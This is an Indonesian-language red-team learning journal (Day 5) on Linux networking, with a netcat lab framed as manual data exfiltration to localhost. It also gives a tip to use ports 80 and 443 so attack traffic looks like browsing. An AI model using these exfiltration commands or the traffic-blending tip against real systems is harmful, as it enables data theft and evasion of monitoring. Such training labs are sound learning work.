# 🌐 Day 5: Linux Networking & Command Control

**Status:** Completed ✅

**Fokus:** Networking Basics, Port Handling, dan Data Exfiltration menggunakan Netcat.

---

## 📖 1. Teori Dasar (Red Team Context)

Hari ini saya belajar bahwa "Hacking tanpa Networking itu mustahil". Sebagai Red Teamer, kita harus paham bagaimana cara membuka jalur komunikasi antara komputer penyerang dan korban.

### Konsep Kunci:
* **IP Address (`ip addr`):** Alamat identitas mesin. Penting untuk diketahui agar payload/malware tahu harus "menelepon" ke mana.
* **Ports (`ss -antp`):** Pintu masuk layanan.
    * *Listening:* Status di mana port terbuka dan menunggu koneksi.
    * *Red Team Note:* Kita sering menggunakan port umum (80, 443) agar traffic serangan terlihat seperti traffic browsing biasa.
* **Netcat (`nc`):** Alat "Swiss Army Knife" untuk jaringan. Bisa digunakan untuk chatting, debugging, hingga mengirim file secara manual.

---

## 🛠️ 2. Lab Practice: Manual Data Exfiltration

**Misi:** Mensimulasikan pencurian data dari komputer korban (Sender) ke komputer penyerang (Receiver/Listener) menggunakan protokol TCP sederhana.

### 🚩 Fase Troubleshooting (The Struggle)
Awalnya, praktik ini tidak berjalan mulus. Saya menemui beberapa error logis dan permission.

![Error Log Day 5](../images/day5-error.png)
*(Gambar: Log error saat percobaan pertama - Permission Denied & Syntax Error)*

**Analisis Kesalahan Saya:**
1.  **`Permission denied`:** Saya mencoba menyuruh Netcat menulis output ke file `rahasia.txt`. Ternyata file tersebut sudah ada sebelumnya (mungkin bekas eksperimen user root/lain), sehingga user saya (`adrian-dwi`) dilarang menimpanya.
2.  **Syntax Error (`usage: nc ...`):** Saat mencoba mengirim file (`< data-penting.txt`), saya lupa memasukkan **IP Tujuan** dan **Port**. Komputer bingung harus mengirim paket ini ke mana.
3.  **Netcat Hang:** Saya sempat bingung kenapa terminal tidak merespons, ternyata saya masih di dalam mode koneksi (belum menekan `Ctrl+C`).

---

### ✅ Fase Keberhasilan (Success)
Setelah memahami error tersebut, saya melakukan perbaikan langkah:

1.  **Reset Environment:** Menghapus file yang macet permissions-nya (`sudo rm rahasia.txt`).
2.  **Listener (Penerima):** Menjalankan `nc -lvnp 4444 > rahasia.txt` (Mode dengar).
3.  **Sender (Pengirim):** Menjalankan `nc 127.0.0.1 4444 < data-penting.txt` (Mode kirim ke localhost).

![Success Log Day 5](../images/day5-success.jpg)
*(Gambar: Transfer file berhasil dan isi pesan terbaca)*

**Hasil:**
File `data-penting.txt` yang berisi pesan *"Ini adalah pesan rahasia dari agen 009"* berhasil ditransfer dan dibaca di terminal penerima. Ini membuktikan jalur Command & Control (C2) berhasil dibuat.

---

## 📝 Key Takeaways (Catatan Penting)

1.  **Ctrl + C is King:** Jika terjebak di dalam perintah yang "hang" atau diam saja (seperti Netcat listener), gunakan `Ctrl + C` untuk mematikan prosesnya.
2.  **Cek Permissions:** Sebelum menulis output ke file (`> file.txt`), pastikan kita punya hak akses di folder/file tersebut.
3.  **Urutan Netcat:** Nyalakan **Listener** dulu, baru jalankan **Connect** di sisi pengirim. Jika tidak ada yang mendengar, pengirim akan error `Connection refused`.

---

**Next Steps:**
Lanjut ke **Day 6: Bash Scripting** untuk mengotomatisasi perintah-perintah network ini menjadi satu tools recon sederhana.
